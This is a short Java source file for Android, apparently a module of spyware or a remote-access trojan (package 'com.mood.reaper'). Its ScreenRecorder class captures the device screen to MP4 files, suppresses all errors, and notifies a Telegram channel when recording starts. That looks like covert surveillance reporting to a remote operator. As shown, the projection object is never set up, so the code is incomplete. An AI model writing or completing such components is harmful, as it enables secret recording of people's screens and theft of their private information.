package com.mood.reaper;

import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;

public class ScreenRecorder {
    private MediaProjectionManager projectionManager;
    private MediaProjection projection;
    private MediaRecorder recorder;
    private VirtualDisplay display;

    public void startRecording() {
        recorder = new MediaRecorder();
        recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        recorder.setVideoSize(720, 1280);
        recorder.setVideoFrameRate(30);
        recorder.setOutputFile("/sdcard/screen_" + System.currentTimeMillis() + ".mp4");
        try {
            recorder.prepare();
            display = projection.createVirtualDisplay("ScreenRecorder",
                    720, 1280, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    recorder.getSurface(), null, null);
            recorder.start();
            Utils.sendToTelegram("🖥️ Screen recording started");
        } catch (Exception e) {}
    }
}